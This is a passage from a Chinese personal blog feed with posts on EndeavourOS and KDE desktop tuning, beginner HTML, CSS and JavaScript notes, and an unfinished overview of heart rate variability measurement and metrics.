<p>或许你开了SysRq，先用SysRq抢救一下，见<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvYWRtaW4tZ3VpZGUvc3lzcnEuaHRtbA==">Linux Magic System Request Key Hacks<i class="fa fa-external-link-alt"></i></span>，或者直接看<span class="exturl" data-url="aHR0cDovL2Jsb2cubHVqdW45OTcyLndpbi9ibG9nLzIwMTgvMDgvMjIvbGludXjkuIvnmoRzeXNycemUri9pbmRleC5odG1s">linux下的SysRq键<i class="fa fa-external-link-alt"></i></span></p>
<p>再不行就直接尝试长按电源关机了</p>
<h3 id="混成器">混成器</h3>
<p>有Nvidia显卡怕驱动更新出问题可以在设置中将渲染器（混成器）从OpenGL改为XRender，XRender出问题的情况会少一点，虽然很多特效都不支持，性能也略差。没有问题建议还是用OpenGL或者直接关闭特效，XRender没有硬件加速用起来感觉跟OpenGL有明显的体验差距。</p>
<p>另外貌似非整数比缩放的时候透明特效之类的经常不支持，建议直接关了。</p>
<h3 id="baloo">baloo</h3>
<p>禁用baloo：<code>balooctl disable</code> 这个文件索引服务也是个吃性能大户，不管是在GNOME下还是KDE下。可以考虑禁用。要查找文件可以用find命令之类的东西嘛。</p>
<h3 id="kde桌面部件">KDE桌面部件</h3>
<p>美化要稍微谨慎一点，魔改太多了不太稳定</p>
<p>latte-dock：虽然KDE官方维护支持这个，动画效果很漂亮，用起来也很舒服，但是这个实在是吃内存大户。KDE桌面不开多余特效和装各种桌面部件待机内存在300M，装个latte-dock后内存占用比其他所有的加起来还多。把dock的鼠标悬停放大之类的特效关一关。貌似这个的背景透明只有XRender支持。</p>
<p>一个很喜欢的任务栏部件event calendar</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S plasma5-applets-eventcalendar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="双显示器开机右侧出现黑边">双显示器开机右侧出现黑边</h3>
<p>发现是每次开机分辨率变成1680*1050了</p>
<p>先看一下你的显示器编号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>比如我的就是DVI-I-1和DVI-D-0，把这两个分辨率改回1080p</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr --output DVI-I-1 --mode 1920x1080 --rate <span class="token number">60</span>
xrandr --output DVI-D-0 --mode 1920x1080 --rate <span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里有一个自动配置的包<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy8/bmFtZT1hdXRvcmFuZHI=">autorandr<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S autorandr
autorandr horizontal <span class="token operator">&amp;&amp;</span> autorandr vertical <span class="token comment"># 这里我直接把显示长宽分辨率都直接拉满了</span>
autorandr --save test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或者你可以手动编辑<code>/etc/X11/xorg.conf.d</code>下的配置</p>
<p>见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1hyYW5kcg==">Arch Wiki xrandr<i class="fa fa-external-link-alt"></i></span></p>
<p>其实每次开机运行一下xrandr可能更好一点（如果你不是wayland的话），不少人都是这么搞得（顺便刷新调整一下字体啥的</p>
<figure>
<img src="/why-not-try-endeavouros/image-20200923222725926.png" alt="xrandr" /><figcaption aria-hidden="true">xrandr</figcaption>
</figure>
<h2 id="macwin10上的一些软件">Mac/win10上的一些软件</h2>
<p><del>请阅读王垠经典博文完全用linux工作</del> 不少时候用wine还是能搞定的（如果你不在乎wine的稳定性的话），包括一些大型软件，比如PS 当然有的东西用wine体验远没有虚拟机好，拿Virtualbox或者KVM开个虚拟机是个不错的选择。或者身边有闲置安卓机用scrcpy投屏，或者KDE Connect传文件。</p>
<p>部分国产软件开个黑果虚拟机感觉体验比windows虚拟机略好一点 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveGxldC9tYWNPUy1TaW1wbGUtS1ZN">https://github.com/foxlet/macOS-Simple-KVM<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点闲话">一点闲话</h2>
<p>其实我一直很期待Arch系诞生一批用户友好的桌面发行版，就像Debian那样衍生出Ubuntu、Linux Mint那样。（虽然这很不Arch）</p>
<ol type="1">
<li>之前被apt的地狱依赖搞得心态崩了，想用pacman系的（反正打包粒度粗一点好，硬盘现在这么便宜又不在乎占多大地方）</li>
<li>喜欢KDE</li>
<li>想要稳定一点的系统做日常主力搬砖用</li>
<li>安装方便一点。这个倒是无所谓，不过出了事LiveCD抢救也想有个图形界面方便抢修</li>
</ol>
<p>Arch把wifi-menu去掉之后就不太想用原味Arch了，我这笔记本没网口高通网卡Nividia独显实在八字不合，只想佛系地找个好装的iso</p>
<p>KaOS基本符合，然而包太少（加上KCP社区包也还是很少），可惜.... 另一个<span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hha3JhbGludXgub3JnLw==">chakra<i class="fa fa-external-link-alt"></i></span>也是包太少（这个有自己的CCR社区包，包也不多），KDE和Qt骨灰爱好者的宝藏，软件基本全套KDE和Qt（不过据说他们人手不够维护不过来了打算换到）</p>
<p>此外还有各种层出不穷的真*Arch安装器 <span class="exturl" data-url="aHR0cHM6Ly9maXJlcmFpbi5tZS8=">https://firerain.me/<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9nYXJ1ZGFsaW51eC5vcmcvaW5kZXguaHRtbA==">https://garudalinux.org/index.html<i class="fa fa-external-link-alt"></i></span></p>
<p>Antergos的继承者，EndeavourOS满足了前两点，貌似xfce主题魔改了点主题，KDE基本原封不动。当时Manjaro闹分裂，jonathon出走了，我也跟着跑路到了这个发行版;用了一段时间感觉还不错，接近原味Arch, 不像Manjaro一样整了很多超出自己驾驭能力的魔改。推荐各位Manjaro用户和想用pacman又嫌麻烦的用户尝试一下。 现在看win10反而不习惯，索性把教研室搬砖那台win10全格了只装这个（要用到windows的时候上win7虚拟机 ps. win7 和KDE好像啊）</p>
<p>那天还看到肥猫跑到Manjaro群里推这个</p>
<p><img src="/why-not-try-endeavouros/miao.png" /></p>
<p>第二天welcome就有了中文，感动</p>
<p><img src="/why-not-try-endeavouros/miaomiao.png" /></p>
<p>能制止Manjaro的不是Arch佬的疯狂洗手，是另一个比Manjaro更好的Arch简易安装器，EndeavourOS合格了。</p>
<p>最后，不要对EndeavourOS抱有过高的期待，感觉他们人手还是不太足。</p>
<p>不过大方向是走对了，基本上就做做开箱即用和一些代替命令操作的图形界面，没有像Manjaro那样各种魔改搞出很多Arch上反而没有的问题。就比如linux内核切换的图形界面akm，基本上就是代替了archwiki上的手动操作，选项也只有linux,linux-lts,linux-zen几个。不像Manjaro那个内核切换，从linux 5.3 到linux 5.8最新版全都有，非常奔放，你要是真随便选一个linux和linux-lts之外的，哪天滚着滚着就出问题了。</p>
<p><img src="/why-not-try-endeavouros/akm.png" /></p>
<p>Arch的安装脚本和只是换了个皮的安装器层出不穷，目前看来EndeavourOS是最令人满意的一个（好吧，默认是xfce，这个离线装了然后改DE就好了）</p>
<h2 id="最后">最后</h2>
<p>AUR包数量很庞大，但也有一些包目前还没有，有精力和意愿打包的可以去给AUR提交打包 可以参看</p>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy8=">Archlinux User Repository<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0NyZWF0aW5nX3BhY2thZ2Vz">Creating packages<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfVXNlcl9SZXBvc2l0b3J5XyjnroDkvZPkuK3mlocp">Arch用户仓库<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfcGFja2FnaW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(2)-创建一个软件包<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfc3VtYml0aW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(3)-提交软件包到AUR<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>KDE的中文翻译也缺人，有精力的玩家可以去当翻译，中文翻译组在<span class="exturl" data-url="aHR0cHM6Ly9jcm93ZGluLmNvbS9wcm9qZWN0L2tkZW9yZw==">这里<i class="fa fa-external-link-alt"></i></span> KDE那边貌似挺缺打杂苦力的，熟悉Qt的同学可以去给社区做点贡献.</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>KDE</tag>
        <tag>EndeavourOS</tag>
      </tags>
  </entry>
  <entry>
    <title>糊个网页吧</title>
    <url>/4a8d/</url>
    <content><![CDATA[<p>开始补习 <a id="more"></a> 写markdown偶尔要用html的标签，折腾这个博客一堆前端知识，想写个爬虫玩也要在浏览器抡起F12，教研室那个项目也要折腾js，这样下去不行，得整点前端了。 先从html，css，javascript三个补起吧</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">1. HTML to define the content of web pages

2. CSS to specify the layout of web pages

3. JavaScript to program the behavior of web pages<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果只要求能用就行，可以直接三天速成上手（如果不考虑性能和美观程度，以及，兼 容 性），可以手撸上世纪画风老版页面。想好看一点可以直接上模板和框架，可以迅速搞出看起来能用的还不是太难看的界面。建议不是太需要和前端打交道的像用matlab和python包一样，需要什么现学就好了（很多框架会迅速更新换代，学了几年不用基本就凉了，不建议投入过多精力）</p>
<h2 id="html笔记">HTML笔记</h2>
<p>大致格式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span>
<span class="token operator">&lt;</span>html<span class="token operator">></span>
<span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>title<span class="token operator">></span>标题（title）<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>
<span class="token operator">&lt;</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span>h1<span class="token operator">></span>标题（headings）<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
<span class="token operator">&lt;</span>p<span class="token operator">></span>段落<span class="token punctuation">(</span>paragraph<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>html标签(tag), 通常是一对</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tagname</span><span class="token punctuation">></span></span>content goes here...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tagname</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>html属性(Attributes), 比如src，href，width等，style属性可以指定颜色和字体</p>
<p>中文和特殊字符在head标签中声明</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>链接</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://zhangjk98.xyz.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This is a link<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>图片</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>104<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>142<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>空元素 br用来换行</p>
<p>meta标签用来标明一些信息，SEO的时候可能用到</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Zhang.j.k<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 这是一个注释（comments） --></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>格式标签（formatting）</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span> 	Defines bold text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span> 	Defines emphasized text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span> 	Defines italic text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span> 	Defines smaller text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span> 	Defines important text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">></span></span> 	Defines subscripted text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">></span></span> 	Defines superscripted text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span> 	Defines inserted text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">></span></span> 	Defines deleted text
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mark</span><span class="token punctuation">></span></span> 	Defines marked/highlighted text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>引用标签（Quotation）</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span><span class="token punctuation">></span></span> 	Defines an abbreviation or acronym
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span><span class="token punctuation">></span></span> 	Defines a section that is quoted from another source
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>q</span><span class="token punctuation">></span></span> 	Defines a short inline quotation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>html的字符在markdown中会有渲染的问题，如果像显示为纯文本，可以引用或者使用</p>
<h3 id="使用css">使用CSS</h3>
<p>有三种方式，Inline, internal, external Inline就是style那样的加属性 internal用style标签：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
<span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">background-color</span><span class="token punctuation">:</span> powderblue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token selector">h1</span>   <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token selector">p</span>    <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>external是独立出来一个css文件，html进行调用。</p>
<h3 id="使用javascript">使用javascript</h3>
<p>在html中使用script标签引入js进行交互和产生动态效果。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Hello JavaScript!"</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>出于安全问题，有些浏览器禁用js脚本，此时用 noscripts 标签展示相应的替代html内容。</p>
<h2 id="css">CSS</h2>
<p>CSS（Cascading Style Sheets）用来指定html的格式。有selector和declaration两个部分。 像这样:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/*注释这样写*/</span>
<span class="token selector">p</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>CSS在html中的定位有选择id（#后加id）选择class属性（ . 号后加class）两种方式</p>
<h2 id="javascript">Javascript</h2>
<p>这种格式：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Paragraph changed."</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>用scripts标签放到html的head或者body里面</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myScript.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="console控制台调试">Console控制台调试</h3>
<p>调试的时候F12打开控制台，可以看到console输出的信息</p>
<h3 id="json">JSON</h3>
<p>用JSON.stringify和JSON.parse转成字符串和还原</p>
<h3 id="线程">线程</h3>
<p>javascript是用的单线程（在浏览器上）,使用异步</p>
<p>主要是用回调函数、事件监听来实现异步</p>
<h3 id="变量和类">变量和类</h3>
<p>放在函数里加var就是内部变量，否则就是外部变量 类使用new来新建</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> objectSample <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="dom">DOM</h3>
<p>Document Object Model</p>
<p>HTML树形结构，元素被视为节点（node）</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样获取元素。 节点有Document节点（作用于整个HTML）和Element节点</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>也谈心率变异性</title>
    <url>/2873/</url>
    <content><![CDATA[<p>等待填坑 <a id="more"></a></p>
<h2 id="采集">采集</h2>
<p>HRV测定的是NN间期(在正常的窦性心律时就是RR间期)的波动，主要与自主神经调控机制有关。标准的HRV根据正常窦性搏动的NN间期得出的（正常对正常间期，normal-to-normal,<em>NN</em> intervals，即由窦房结除极所致相邻QRS波群之间的所有间期）的变化来表示心率的变异性。</p>
<p><img src="heart-rate-varibility/201804091523323502.png" alt="提取心率变异性" style="zoom: 67%;" /></p>
<h3 id="心电ecg">心电（ECG）</h3>
<p>可以从心电图中直接提取R波尖峰并将RR间期的值用于心率变异性分析</p>
<h3 id="心冲击图bcg">心冲击图（BCG）</h3>
<p>心冲击图去除呼吸和活动的干扰后提取JJ间期时间计算心率变异</p>
<h3 id="光电容积图ppg">光电容积图（PPG）</h3>
<p>目前市面上主要的脉搏波测量方法是光电容积脉搏波描记法（photoplethysmography），用光电传感器检测光经过人体的反射和衰减转换成电信号后得到，包括Apple Waltch等手环产品，用光电容积法检测血氧、心率、心率变异性等生理参数。</p>
<figure>
<img src="/2873/figure-1-optical-heart-rate-sensing.jpg" alt="光电容积法原理" /><figcaption aria-hidden="true">光电容积法原理</figcaption>
</figure>
<p>PPG法采集到的脉搏波经过去噪和整流等处理后提取PP间期可以计算心率变异。</p>
<h4 id="远程光电容积扫描">远程光电容积扫描</h4>
<p>（rPPG，remote PPG）是一种新的方法，只要高清摄像头检测光线变化，真正的无创非接触。</p>
<p>但是这种方法成本高，易受到运动和光线变化的干扰。目前这个领域比较热门，进展也很快。一些补偿和增强鲁棒性的方法包括全局和局部运动跟踪和独立成分分析等。</p>
<p>现在此类研究缺乏可靠的公开数据集支持，现有研究大多采用MAHNOB-HCI和DEAP等用于活体识别和情感识别的公开数据集和私有数据集。</p>
<figure>
<img src="/2873/figure-3-overview-hr-and-hrv.jpg" alt="rPPG-HRV" /><figcaption aria-hidden="true">rPPG-HRV</figcaption>
</figure>
<h2 id="产生机理和影响因素">产生机理和影响因素</h2>
<figure>
<img src="/2873/示意图.png" alt="示意图" /><figcaption aria-hidden="true">示意图</figcaption>
</figure>
<blockquote>
<p>HRV反映的是自主神经和非自主神经系统所有反馈回路极其复杂的非线性交互作用。自主神经系统是窦性节律条件下心率的主要调节机制。</p>
</blockquote>
<p>忽略微小的影响，HRV的高频部分主要受迷走神经的调节，低频部分受到迷走和交感神经的双重作用。</p>
<p><img src="/2873/nero2.jpg" /></p>
<blockquote>
<p>交感神经增强自律性，而副交感神经抑制自律性。交感神经通过增加起搏点去极化程度产生变时性作用，而对心脏起搏点细胞的迷走刺激会引起超极化而降低去极化程度。自主神经的这两个分支均影响与心脏起搏细胞去极化相关的离子通道的活动。</p>
</blockquote>
<p>被测者的体位也会显著影响HRV，多数人处于仰卧位时，副交感神经活动明显增强。</p>
<p>在突然站立或倾斜时，压力反射活动也会引起心率的同步波动。</p>
<p>在24小时HRV中，白天交感神经活动相对增强，心率较快，而夜间迷走神经活动增强，心率较慢。正常睡眠时，生理活动也随每个睡眠周期(约90分钟)而呈现明显节律。</p>
<p>精神情绪的波动也会影响HRV，和迷走神经和交感神经系统的兴奋性有关。</p>
<p><img src="heart-rate-varibility/image-20191225214555467.png" alt="image-20191225214555467" style="zoom:50%;" /></p>
<p>此外，非自主神经因素(如神经内分泌功能)也会影响HRV。</p>
<p>心率变异性也和年龄、性别等因素有关。</p>
<h2 id="主要指标和数据分析">主要指标和数据分析</h2>
<h3 id="时域特征">时域特征</h3>
<p>医学上通常要求5分钟以上的的HRV做短时分析，但是有研究表明30s内的HF和LF和5分钟的没有太大区别，应用是可以进一步缩短检测时间。</p>
<ul>
<li><p>SDNN(ms)：NN间期(正常RR间期)的标准差(5分钟)</p></li>
<li><p>SDANN(ms)：NN间期(正常RR间期)的标准差（24小时）</p></li>
<li><p>pNN50：相邻NN间期相差&gt;50ms的数量占总心搏数的百 分比</p></li>
<li><p>rMSSD(ms)：相邻NN间期差值的均方根</p></li>
</ul>
<p>rMSSD反映每搏NN间期变化的平均绝对值，对不规律心搏和/或心搏波形标记错误的敏感性也很高。</p>
<p>24小时记录得到的SDANN值低下表明缺乏昼夜节律。</p>
<h3 id="频域特征">频域特征</h3>
<ul>
<li><p>总功率（TP）：频段≤0. 4Hz。</p></li>
<li><p>超低频功率（ULF）：频段≤ 0. 003Hz。</p></li>
<li><p>极低频功率（VLF）：频段 0. 003~0. 04Hz。</p></li>
<li><p>低频功率（LF）：频段 0. 04~0. 15Hz。</p></li>
<li><p>高频功率（HF）：频段 0. 15~0. 4Hz。</p></li>
<li><p>LF/HF: 低频功率和高频功率的比值</p></li>
</ul>
<p>LF反映副交感传出神经(迷走神经)和交感传出神经系统活性的综合调节</p>
<p>HF反映副交感传出神经(迷走神经)活动的调节</p>
<h3 id="非线性分析">非线性分析</h3>
<h4 id="动态心电图holter-monitor">动态心电图（Holter monitor）</h4>
<p>持续记录24小时或更久（几个月或一年以上）的长时间心电图数据，主要用来检测心律失常或传导异常和晕厥或晕厥前兆。</p>
<p><span class="math inline">\(a\dot{b}c\)</span></p>
<h5 id="洛伦兹散点图">洛伦兹散点图</h5>
<p><img src="heart-rate-varibility/201804091524569747.png" alt="img" style="zoom:80%;" /></p>
<p>把前1个心动周期长度（ms）定为横坐标、后1个心动周期长度（ms）定为纵坐标，即可在直角坐标系中确定一点。这样一个点就由3个QRS波（R波）、2个RR间期决定。第1个RR间期R1R2和第2个RR间期R2R3为第1个点，第2个RR间期R2R3和第3个RR间期R3R4为第2个点，依次类推，从R1 -&gt; Rn作图就可得到 n-2 个点，绘制心率散点图（洛伦兹散点图，Lorenz Plot），判断窦性心率、室上性和室性心率失常。正常窦性心律呈彗星状，心衰、房颤等症状会出现不同的散点图。窦性心律沿45°线分布，呈彗星状</p>
<p><img src="heart-rate-varibility/image-20191224202624859.png" alt="室性早搏" style="zoom: 67%;" /></p>
<p><img src="heart-rate-varibility/image-20191224202756257.png" alt="房性早搏" style="zoom: 67%;" /></p>
<p>散点图可用于：</p>
<p>评价心率波动范围（散点图的位置分布）</p>
<p>评价自主神经调节（长轴）</p>
<p>评价心率变异（短轴）</p>
<p>诊断心律失常（散点图的形态）</p>
<h5 id="差值散点图">差值散点图</h5>
<p>首先对序列 <span class="math inline">\(RiR_{i+1}\)</span> 做一阶差分, 得到序列 <span class="math inline">\(d_j ,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
<p>首先对序列<span class="math inline">\(R_iR_{i\times1}\)</span>做一阶差分, 得到序列 <span class="math inline">\(d_j,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
<figure>
<img src="/2873/image-20191225111057030.png" alt="健康人和CHF患者的散点图" /><figcaption aria-hidden="true">健康人和CHF患者的散点图</figcaption>
</figure>
<h5 id="三维散点图">三维散点图</h5>
<p>三维散点图的一些意义还不明确，医院里实际用的也很少 <img src="/2873/3D-scatter-plot.png" alt="心率变异性三维散点图" /></p>
<h5 id="心率震荡hrt">心率震荡（HRT）</h5>
<p>心率震荡（heart rate turbulence）是指发生室性早搏后，窦性心律出现短暂的加速和减速的过程。检测HRT异常有助于预测自主神经功能障碍以及心血管事件的风险增加。</p>
